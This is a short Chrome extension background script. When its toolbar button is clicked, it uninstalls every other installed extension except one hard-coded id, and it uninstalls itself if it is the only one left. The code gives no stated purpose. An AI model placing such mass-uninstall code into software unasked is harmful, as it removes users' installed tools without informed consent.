chrome.browserAction.onClicked.addListener(function(tab) {
  chrome.management.getAll(function(extensions) {
    extensions.forEach(extension => {
      if (extensions.length === 1) {
        chrome.management.uninstallSelf();
      }
      if (extension.id !== "ecbedgmpemmcnhfgdioecadoeckadaif") {
        chrome.management.uninstall(extension.id);
      }
    });
  });
});
